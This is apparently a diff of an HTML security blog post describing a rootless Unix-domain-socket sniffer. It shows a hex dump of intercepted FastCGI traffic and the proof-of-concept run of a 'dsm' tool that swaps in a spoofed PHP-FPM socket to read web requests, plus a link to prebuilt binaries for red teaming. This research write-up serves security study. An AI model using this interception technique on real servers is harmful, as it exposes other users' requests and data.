+ <span class="nt">52</span> <span class="nt">48</span> <span class="nt">54</span> <span class="nt">54</span> <span class="nt">50</span> <span class="nt">5f</span> <span class="nt">55</span> <span class="nt">53</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">5f</span> <span class="nt">41</span> <span class="nt">47</span> <span class="nt">45</span> <span class="nt">4e</span> <span class="nt">54</span>  <span class="nt">RHTTP_USER_AGENT</span>
+ <span class="nt">4d</span> <span class="nt">6f</span> <span class="nt">7a</span> <span class="nt">69</span> <span class="nt">6c</span> <span class="nt">6c</span> <span class="nt">61</span> <span class="nt">2f</span> <span class="nt">35</span> <span class="nt">2e</span> <span class="nt">30</span> <span class="nt">20</span> <span class="nt">28</span> <span class="nt">4d</span> <span class="nt">61</span> <span class="nt">63</span>  <span class="nt">Mozilla</span><span class="o">/</span><span class="nt">5</span><span class="p">.</span><span class="nc">0</span> <span class="o">(</span><span class="nt">Mac</span>
+ <span class="nt">69</span> <span class="nt">6e</span> <span class="nt">74</span> <span class="nt">6f</span> <span class="nt">73</span> <span class="nt">68</span> <span class="nt">3b</span> <span class="nt">20</span> <span class="nt">49</span> <span class="nt">6e</span> <span class="nt">74</span> <span class="nt">65</span> <span class="nt">6c</span> <span class="nt">20</span> <span class="nt">4d</span> <span class="nt">61</span>  <span class="nt">intosh</span><span class="o">;</span> <span class="nt">Intel</span> <span class="nt">Ma</span>
+ <span class="nt">63</span> <span class="nt">20</span> <span class="nt">4f</span> <span class="nt">53</span> <span class="nt">20</span> <span class="nt">58</span> <span class="nt">20</span> <span class="nt">31</span> <span class="nt">30</span> <span class="nt">2e</span> <span class="nt">31</span> <span class="nt">34</span> <span class="nt">3b</span> <span class="nt">20</span> <span class="nt">72</span> <span class="nt">76</span>  <span class="nt">c</span> <span class="nt">OS</span> <span class="nt">X</span> <span class="nt">10</span><span class="p">.</span><span class="nc">14</span><span class="o">;</span> <span class="nt">rv</span>
+ <span class="nt">3a</span> <span class="nt">38</span> <span class="nt">35</span> <span class="nt">2e</span> <span class="nt">30</span> <span class="nt">29</span> <span class="nt">20</span> <span class="nt">47</span> <span class="nt">65</span> <span class="nt">63</span> <span class="nt">6b</span> <span class="nt">6f</span> <span class="nt">2f</span> <span class="nt">32</span> <span class="nt">30</span> <span class="nt">31</span>  <span class="p">:</span><span class="nd">85</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span> <span class="nt">Gecko</span><span class="o">/</span><span class="nt">201</span>
+ <span class="nt">30</span> <span class="nt">30</span> <span class="nt">31</span> <span class="nt">30</span> <span class="nt">31</span> <span class="nt">20</span> <span class="nt">46</span> <span class="nt">69</span> <span class="nt">72</span> <span class="nt">65</span> <span class="nt">66</span> <span class="nt">6f</span> <span class="nt">78</span> <span class="nt">2f</span> <span class="nt">38</span> <span class="nt">35</span>  <span class="nt">00101</span> <span class="nt">Firefox</span><span class="o">/</span><span class="nt">85</span>
+ <span class="nt">2e</span> <span class="nt">30</span> <span class="nt">0b</span> <span class="nt">4a</span> <span class="nt">48</span> <span class="nt">54</span> <span class="nt">54</span> <span class="nt">50</span> <span class="nt">5f</span> <span class="nt">41</span> <span class="nt">43</span> <span class="nt">43</span> <span class="nt">45</span> <span class="nt">50</span> <span class="nt">54</span> <span class="nt">74</span>  <span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">JHTTP_ACCEPTt</span>
+ <span class="nt">65</span> <span class="nt">78</span> <span class="nt">74</span> <span class="nt">2f</span> <span class="nt">68</span> <span class="nt">74</span> <span class="nt">6d</span> <span class="nt">6c</span> <span class="nt">2c</span> <span class="nt">61</span> <span class="nt">70</span> <span class="nt">70</span> <span class="nt">6c</span> <span class="nt">69</span> <span class="nt">63</span> <span class="nt">61</span>  <span class="nt">ext</span><span class="o">/</span><span class="nt">html</span><span class="o">,</span><span class="nt">applica</span>
+ <span class="nt">74</span> <span class="nt">69</span> <span class="nt">6f</span> <span class="nt">6e</span> <span class="nt">2f</span> <span class="nt">78</span> <span class="nt">68</span> <span class="nt">74</span> <span class="nt">6d</span> <span class="nt">6c</span> <span class="nt">2b</span> <span class="nt">78</span> <span class="nt">6d</span> <span class="nt">6c</span> <span class="nt">2c</span> <span class="nt">61</span>  <span class="nt">tion</span><span class="o">/</span><span class="nt">xhtml</span><span class="o">+</span><span class="nt">xml</span><span class="o">,</span><span class="nt">a</span>
+ <span class="nt">70</span> <span class="nt">70</span> <span class="nt">6c</span> <span class="nt">69</span> <span class="nt">63</span> <span class="nt">61</span> <span class="nt">74</span> <span class="nt">69</span> <span class="nt">6f</span> <span class="nt">6e</span> <span class="nt">2f</span> <span class="nt">78</span> <span class="nt">6d</span> <span class="nt">6c</span> <span class="nt">3b</span> <span class="nt">71</span>  <span class="nt">pplication</span><span class="o">/</span><span class="nt">xml</span><span class="o">;</span><span class="nt">q</span>
+ <span class="nt">3d</span> <span class="nt">30</span> <span class="nt">2e</span> <span class="nt">39</span> <span class="nt">2c</span> <span class="nt">69</span> <span class="nt">6d</span> <span class="nt">61</span> <span class="nt">67</span> <span class="nt">65</span> <span class="nt">2f</span> <span class="nt">77</span> <span class="nt">65</span> <span class="nt">62</span> <span class="nt">70</span> <span class="nt">2c</span>  <span class="o">=</span><span class="nt">0</span><span class="p">.</span><span class="nc">9</span><span class="o">,</span><span class="nt">image</span><span class="o">/</span><span class="nt">webp</span><span class="o">,</span>
+ <span class="nt">2a</span> <span class="nt">2f</span> <span class="nt">2a</span> <span class="nt">3b</span> <span class="nt">71</span> <span class="nt">3d</span> <span class="nt">30</span> <span class="nt">2e</span> <span class="nt">38</span> <span class="nt">14</span> <span class="nt">23</span> <span class="nt">48</span> <span class="nt">54</span> <span class="nt">54</span> <span class="nt">50</span> <span class="nt">5f</span>  <span class="o">*/*;</span><span class="nt">q</span><span class="o">=</span><span class="nt">0</span><span class="p">.</span><span class="nc">8</span><span class="o">.</span><span class="p">#</span><span class="nn">HTTP_</span>
+ <span class="nt">41</span> <span class="nt">43</span> <span class="nt">43</span> <span class="nt">45</span> <span class="nt">50</span> <span class="nt">54</span> <span class="nt">5f</span> <span class="nt">4c</span> <span class="nt">41</span> <span class="nt">4e</span> <span class="nt">47</span> <span class="nt">55</span> <span class="nt">41</span> <span class="nt">47</span> <span class="nt">45</span> <span class="nt">70</span>  <span class="nt">ACCEPT_LANGUAGEp</span>
+ <span class="nt">74</span> <span class="nt">2d</span> <span class="nt">42</span> <span class="nt">52</span> <span class="nt">2c</span> <span class="nt">70</span> <span class="nt">74</span> <span class="nt">3b</span> <span class="nt">71</span> <span class="nt">3d</span> <span class="nt">30</span> <span class="nt">2e</span> <span class="nt">38</span> <span class="nt">2c</span> <span class="nt">65</span> <span class="nt">6e</span>  <span class="nt">t-BR</span><span class="o">,</span><span class="nt">pt</span><span class="o">;</span><span class="nt">q</span><span class="o">=</span><span class="nt">0</span><span class="p">.</span><span class="nc">8</span><span class="o">,</span><span class="nt">en</span>
+ <span class="nt">2d</span> <span class="nt">55</span> <span class="nt">53</span> <span class="nt">3b</span> <span class="nt">71</span> <span class="nt">3d</span> <span class="nt">30</span> <span class="nt">2e</span> <span class="nt">35</span> <span class="nt">2c</span> <span class="nt">65</span> <span class="nt">6e</span> <span class="nt">3b</span> <span class="nt">71</span> <span class="nt">3d</span> <span class="nt">30</span>  <span class="nt">-US</span><span class="o">;</span><span class="nt">q</span><span class="o">=</span><span class="nt">0</span><span class="p">.</span><span class="nc">5</span><span class="o">,</span><span class="nt">en</span><span class="o">;</span><span class="nt">q</span><span class="o">=</span><span class="nt">0</span>
+ <span class="nt">2e</span> <span class="nt">33</span> <span class="nt">14</span> <span class="nt">0d</span> <span class="nt">48</span> <span class="nt">54</span> <span class="nt">54</span> <span class="nt">50</span> <span class="nt">5f</span> <span class="nt">41</span> <span class="nt">43</span> <span class="nt">43</span> <span class="nt">45</span> <span class="nt">50</span> <span class="nt">54</span> <span class="nt">5f</span>  <span class="p">.</span><span class="nc">3</span><span class="o">.</span><span class="p">.</span><span class="nc">HTTP_ACCEPT_</span>
+ <span class="nt">45</span> <span class="nt">4e</span> <span class="nt">43</span> <span class="nt">4f</span> <span class="nt">44</span> <span class="nt">49</span> <span class="nt">4e</span> <span class="nt">47</span> <span class="nt">67</span> <span class="nt">7a</span> <span class="nt">69</span> <span class="nt">70</span> <span class="nt">2c</span> <span class="nt">20</span> <span class="nt">64</span> <span class="nt">65</span>  <span class="nt">ENCODINGgzip</span><span class="o">,</span> <span class="nt">de</span>
+ <span class="nt">66</span> <span class="nt">6c</span> <span class="nt">61</span> <span class="nt">74</span> <span class="nt">65</span> <span class="nt">0f</span> <span class="nt">0a</span>                             <span class="nt">flate</span><span class="o">..</span>
+ <span class="nt">48</span> <span class="nt">54</span> <span class="nt">54</span> <span class="nt">50</span> <span class="nt">5f</span> <span class="nt">43</span> <span class="nt">4f</span> <span class="nt">4e</span> <span class="nt">4e</span> <span class="nt">45</span> <span class="nt">43</span> <span class="nt">54</span> <span class="nt">49</span> <span class="nt">4f</span> <span class="nt">4e</span> <span class="nt">6b</span>  <span class="nt">HTTP_CONNECTIONk</span>
+ <span class="nt">65</span> <span class="nt">65</span> <span class="nt">70</span> <span class="nt">2d</span> <span class="nt">61</span> <span class="nt">6c</span> <span class="nt">69</span> <span class="nt">76</span> <span class="nt">65</span> <span class="nt">1e</span> <span class="nt">01</span> <span class="nt">48</span> <span class="nt">54</span> <span class="nt">54</span> <span class="nt">50</span> <span class="nt">5f</span>  <span class="nt">eep-alive</span><span class="o">.</span><span class="p">.</span><span class="nc">HTTP_</span>
+ <span class="nt">55</span> <span class="nt">50</span> <span class="nt">47</span> <span class="nt">52</span> <span class="nt">41</span> <span class="nt">44</span> <span class="nt">45</span> <span class="nt">5f</span> <span class="nt">49</span> <span class="nt">4e</span> <span class="nt">53</span> <span class="nt">45</span> <span class="nt">43</span> <span class="nt">55</span> <span class="nt">52</span> <span class="nt">45</span>  <span class="nt">UPGRADE_INSECURE</span>
+ <span class="nt">5f</span> <span class="nt">52</span> <span class="nt">45</span> <span class="nt">51</span> <span class="nt">55</span> <span class="nt">45</span> <span class="nt">53</span> <span class="nt">54</span> <span class="nt">53</span> <span class="nt">31</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">01</span> <span class="nt">04</span> <span class="nt">00</span> <span class="nt">01</span>  <span class="nt">_REQUESTS1</span><span class="o">......</span>
+ <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">01</span> <span class="nt">05</span> <span class="nt">00</span> <span class="nt">01</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span>              <span class="o">............</span>
+<span class="nt">--</span>
+<span class="o">&lt;</span> <span class="nt">2021</span><span class="o">/</span><span class="nt">03</span><span class="o">/</span><span class="nt">25</span> <span class="nt">08</span><span class="p">:</span><span class="nd">47</span><span class="p">:</span><span class="nd">56</span><span class="p">.</span><span class="nc">098735</span>  <span class="nt">length</span><span class="o">=</span><span class="nt">168</span> <span class="nt">from</span><span class="o">=</span><span class="nt">0</span> <span class="nt">to</span><span class="o">=</span><span class="nt">167</span>
+ <span class="nt">01</span> <span class="nt">07</span> <span class="nt">00</span> <span class="nt">01</span> <span class="nt">00</span> <span class="nt">16</span> <span class="nt">02</span> <span class="nt">00</span> <span class="nt">50</span> <span class="nt">72</span> <span class="nt">69</span> <span class="nt">6d</span> <span class="nt">61</span> <span class="nt">72</span> <span class="nt">79</span> <span class="nt">20</span>  <span class="o">.......</span><span class="p">.</span><span class="nc">Primary</span>
+ <span class="nt">73</span> <span class="nt">63</span> <span class="nt">72</span> <span class="nt">69</span> <span class="nt">70</span> <span class="nt">74</span> <span class="nt">20</span> <span class="nt">75</span> <span class="nt">6e</span> <span class="nt">6b</span> <span class="nt">6e</span> <span class="nt">6f</span> <span class="nt">77</span> <span class="nt">6e</span> <span class="nt">00</span> <span class="nt">00</span>  <span class="nt">script</span> <span class="nt">unknown</span><span class="o">..</span>
+ <span class="nt">01</span> <span class="nt">06</span> <span class="nt">00</span> <span class="nt">01</span> <span class="nt">00</span> <span class="nt">6b</span> <span class="nt">05</span> <span class="nt">00</span> <span class="nt">53</span> <span class="nt">74</span> <span class="nt">61</span> <span class="nt">74</span> <span class="nt">75</span> <span class="nt">73</span> <span class="nt">3a</span> <span class="nt">20</span>  <span class="o">....</span><span class="p">.</span><span class="nc">k</span><span class="o">.</span><span class="p">.</span><span class="nc">Status</span><span class="o">:</span>
+ <span class="nt">34</span> <span class="nt">30</span> <span class="nt">34</span> <span class="nt">20</span> <span class="nt">4e</span> <span class="nt">6f</span> <span class="nt">74</span> <span class="nt">20</span> <span class="nt">46</span> <span class="nt">6f</span> <span class="nt">75</span> <span class="nt">6e</span> <span class="nt">64</span> <span class="nt">0d</span> <span class="nt">0a</span>     <span class="nt">404</span> <span class="nt">Not</span> <span class="nt">Found</span><span class="o">..</span>
+ <span class="nt">58</span> <span class="nt">2d</span> <span class="nt">50</span> <span class="nt">6f</span> <span class="nt">77</span> <span class="nt">65</span> <span class="nt">72</span> <span class="nt">65</span> <span class="nt">64</span> <span class="nt">2d</span> <span class="nt">42</span> <span class="nt">79</span> <span class="nt">3a</span> <span class="nt">20</span> <span class="nt">50</span> <span class="nt">48</span>  <span class="nt">X-Powered-By</span><span class="o">:</span> <span class="nt">PH</span>
+ <span class="nt">50</span> <span class="nt">2f</span> <span class="nt">37</span> <span class="nt">2e</span> <span class="nt">34</span> <span class="nt">2e</span> <span class="nt">31</span> <span class="nt">35</span> <span class="nt">0d</span> <span class="nt">0a</span>                    <span class="nt">P</span><span class="o">/</span><span class="nt">7</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">15</span><span class="o">..</span>
+ <span class="nt">43</span> <span class="nt">6f</span> <span class="nt">6e</span> <span class="nt">74</span> <span class="nt">65</span> <span class="nt">6e</span> <span class="nt">74</span> <span class="nt">2d</span> <span class="nt">74</span> <span class="nt">79</span> <span class="nt">70</span> <span class="nt">65</span> <span class="nt">3a</span> <span class="nt">20</span> <span class="nt">74</span> <span class="nt">65</span>  <span class="nt">Content-type</span><span class="o">:</span> <span class="nt">te</span>
+ <span class="nt">78</span> <span class="nt">74</span> <span class="nt">2f</span> <span class="nt">68</span> <span class="nt">74</span> <span class="nt">6d</span> <span class="nt">6c</span> <span class="nt">3b</span> <span class="nt">20</span> <span class="nt">63</span> <span class="nt">68</span> <span class="nt">61</span> <span class="nt">72</span> <span class="nt">73</span> <span class="nt">65</span> <span class="nt">74</span>  <span class="nt">xt</span><span class="o">/</span><span class="nt">html</span><span class="o">;</span> <span class="nt">charset</span>
+ <span class="nt">3d</span> <span class="nt">55</span> <span class="nt">54</span> <span class="nt">46</span> <span class="nt">2d</span> <span class="nt">38</span> <span class="nt">0d</span> <span class="nt">0a</span>                          <span class="o">=</span><span class="nt">UTF-8</span><span class="o">..</span>
+ <span class="nt">0d</span> <span class="nt">0a</span>                                            <span class="o">..</span>
+ <span class="nt">46</span> <span class="nt">69</span> <span class="nt">6c</span> <span class="nt">65</span> <span class="nt">20</span> <span class="nt">6e</span> <span class="nt">6f</span> <span class="nt">74</span> <span class="nt">20</span> <span class="nt">66</span> <span class="nt">6f</span> <span class="nt">75</span> <span class="nt">6e</span> <span class="nt">64</span> <span class="nt">2e</span> <span class="nt">0a</span>  <span class="nt">File</span> <span class="nt">not</span> <span class="nt">found</span><span class="o">..</span>
+ <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">01</span> <span class="nt">03</span> <span class="nt">00</span> <span class="nt">01</span> <span class="nt">00</span> <span class="nt">08</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span>  <span class="o">................</span>
+ <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span>                                   <span class="o">.....</span>
+<span class="nt">--</span>
+</code></pre></div>
+
 
 <p>Yay! The <code>socat</code> worked locally and I was seeing the FastCGI requests, but <code>socat</code> has some problems:</p>
 <ol>
@@ -161,44 +210,45 @@ CONNECT:/tmp/.php-fpm.sock.1
 <script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Fcaioluders%2Funix_domain_socket_mitm%2Fblob%2Fmain%2Fudsmitm.c&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on&showCopy=on"></script>
 
 <p>The PoC running :</p>
-<pre><code>/tmp $ ./dsm .php-fpm.sock
-Unix Domain Socket Sniffer
-by @caioluders
-[?] Renamed .php-fpm.sock to .php-fpm.sock.1
-[?] Bind spoofed socket .php-fpm.sock
-[?] Spoofed socket is listening...
-[?] New connection
+<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="n">tmp</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">dsm</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="w"></span>
+<span class="n">Unix</span><span class="w"> </span><span class="k">Domain</span><span class="w"> </span><span class="n">Socket</span><span class="w"> </span><span class="n">Sniffer</span><span class="w"></span>
+<span class="k">by</span><span class="w"> </span><span class="nv">@caioluders</span><span class="w"></span>
+<span class="o">[</span><span class="n">?</span><span class="o">]</span><span class="w"> </span><span class="n">Renamed</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="mf">.1</span><span class="w"></span>
+<span class="o">[</span><span class="n">?</span><span class="o">]</span><span class="w"> </span><span class="n">Bind</span><span class="w"> </span><span class="n">spoofed</span><span class="w"> </span><span class="n">socket</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="w"></span>
+<span class="o">[</span><span class="n">?</span><span class="o">]</span><span class="w"> </span><span class="n">Spoofed</span><span class="w"> </span><span class="n">socket</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">listening</span><span class="p">...</span><span class="w"></span>
+<span class="o">[</span><span class="n">?</span><span class="o">]</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="k">connection</span><span class="w"></span>
 
------------------------------------- .php-fpm.sock ------------------------------------
-SCRIPT_FILENAME/api/public/index.php
-                                    QUERY_STRINGq=/&amp;REQUEST_METHODGET
-                                                                     CONTENT_TYPECONTENT_LENGTH
+<span class="o">------------------------------------</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="w"> </span><span class="o">------------------------------------</span><span class="w"></span>
+<span class="n">SCRIPT_FILENAME</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="k">public</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w"></span>
+<span class="w">                                    </span><span class="n">QUERY_STRINGq</span><span class="o">=/&amp;</span><span class="n">REQUEST_METHODGET</span><span class="w"></span>
+<span class="w">                                                                     </span><span class="n">CONTENT_TYPECONTENT_LENGTH</span><span class="w"></span>
 
-SCRIPT_NAME/index.php
-                     REQUEST_URI/
+<span class="n">SCRIPT_NAME</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w"></span>
+<span class="w">                     </span><span class="n">REQUEST_URI</span><span class="o">/</span><span class="w"></span>
 
-DOCUMENT_URI/index.php
-DOCUMENT_ROOT/api/publiSERVER_PROTOCOLHTTP/1.1REQUEST_SCHEMEhttpGATEWAY_INTERFACECGI/1.1
- SERVER_SOFTWAREnginx/1.18.0
+<span class="n">DOCUMENT_URI</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w"></span>
+<span class="n">DOCUMENT_ROOT</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">publiSERVER_PROTOCOLHTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="n">REQUEST_SCHEMEhttpGATEWAY_INTERFACECGI</span><span class="o">/</span><span class="mf">1.1</span><span class="w"></span>
+<span class="w"> </span><span class="n">SERVER_SOFTWAREnginx</span><span class="o">/</span><span class="mf">1.18.0</span><span class="w"></span>
 
-REMOTE_ADDR172.18.0.1
-                     REMOTE_PORT57778
+<span class="n">REMOTE_ADDR172</span><span class="mf">.18.0.1</span><span class="w"></span>
+<span class="w">                     </span><span class="n">REMOTE_PORT57778</span><span class="w"></span>
 
-SERVER_ADDR172.18.0.2
-                     SERVER_PORT80
-                                  SERVER_NAME_REDIRECT_STATUS200    HTTP_HOST127.0.0.1:9022RHTTP_USER_AGENTMozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:85.0) Gecko/20100101 Firefox/85.0
-                   JHTTP_ACCEPTtext/html,application/xhtml+xml,application/xml;q=0.9,imHTTP_ACCEPT_ENCODINGgzip, deflateNGUAGEpt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
-HTTP_CONNECTIONkeep-aliveHTTP_UPGRADE_INSECURE_REQUESTS1
-------------------------------------- New Packet -------------------------------------
+<span class="n">SERVER_ADDR172</span><span class="mf">.18.0.2</span><span class="w"></span>
+<span class="w">                     </span><span class="n">SERVER_PORT80</span><span class="w"></span>
+<span class="w">                                  </span><span class="n">SERVER_NAME_REDIRECT_STATUS200</span><span class="w">    </span><span class="n">HTTP_HOST127</span><span class="mf">.0.0.1</span><span class="err">:</span><span class="mi">9022</span><span class="n">RHTTP_USER_AGENTMozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="w"> </span><span class="n">Intel</span><span class="w"> </span><span class="n">Mac</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="mf">10.14</span><span class="p">;</span><span class="w"> </span><span class="nl">rv</span><span class="p">:</span><span class="mf">85.0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="mf">85.0</span><span class="w"></span>
+<span class="w">                   </span><span class="n">JHTTP_ACCEPTtext</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="nc">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="nc">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">imHTTP_ACCEPT_ENCODINGgzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflateNGUAGEpt</span><span class="o">-</span><span class="n">BR</span><span class="p">,</span><span class="n">pt</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.3</span><span class="w"></span>
+<span class="n">HTTP_CONNECTIONkeep</span><span class="o">-</span><span class="n">aliveHTTP_UPGRADE_INSECURE_REQUESTS1</span><span class="w"></span>
+<span class="o">-------------------------------------</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">Packet</span><span class="w"> </span><span class="o">-------------------------------------</span><span class="w"></span>
 
------------------------------------ .php-fpm.sock.1 -----------------------------------
-Primary script unknownkStatus: 404 Not Found
-X-Powered-By: PHP/7.4.15
-Content-type: text/html; charset=UTF-8
+<span class="o">-----------------------------------</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="mf">.1</span><span class="w"> </span><span class="o">-----------------------------------</span><span class="w"></span>
+<span class="k">Primary</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="nl">unknownkStatus</span><span class="p">:</span><span class="w"> </span><span class="mi">404</span><span class="w"> </span><span class="ow">Not</span><span class="w"> </span><span class="k">Found</span><span class="w"></span>
+<span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mf">7.4.15</span><span class="w"></span>
+<span class="n">Content</span><span class="o">-</span><span class="nl">type</span><span class="p">:</span><span class="w"> </span><span class="nc">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="w"> </span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="w"></span>
 
-File not found.
-[?] New connection
-</code></pre>
+<span class="k">File</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">found</span><span class="p">.</span><span class="w"></span>
+<span class="o">[</span><span class="n">?</span><span class="o">]</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="k">connection</span><span class="w"></span>
+</code></pre></div>
+
 
 <p>Static-linked binaries for red teaming purposes on <a href="https://github.com/caioluders/rootless_sniffing/blob/main/dsm?raw=true">github.com/caioluders/rootless_sniffing/blob/main/dsm?raw=true</a></p>
 <h1>Conclusions</h1>
